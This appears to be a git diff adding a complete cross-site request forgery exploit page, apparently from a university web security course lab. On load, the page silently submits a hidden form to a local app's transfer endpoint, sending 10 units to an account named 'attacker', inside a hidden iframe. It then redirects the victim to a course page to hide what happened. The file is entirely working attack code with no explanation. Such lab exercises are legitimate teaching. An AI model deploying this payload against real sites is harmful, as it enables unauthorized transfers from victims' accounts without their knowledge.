@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <script>
+            const hijack_url = "http://sharif.edu/~kharrazi/courses/40441-011/";
+            var submitted = false;
+            function transfer_bar() {
+                document.transfer_form.submit();
+                submitted = true;
+            }
+            function hijack() {
+                if (submitted) {
+                    window.location.replace(hijack_url);
+                }
+            }
+        </script>
+    </head>
+    <body onload="transfer_bar()">
+        <form target="transformFrame" name="transfer_form" action="http://localhost:3000/post_transfer" method="POST">
+            <input hidden="true" type="text" name="destination_username" value="attacker">
+            <input hidden="true" type="text" name="quantity" value="10">
+            <!-- <input hidden = "true" type="submit" value="Submit request"> -->
+        </form>
+        <iframe hidden="true" name="transformFrame" id="transformFrame" onload="hijack()"></iframe>
+    </body>
+</html>
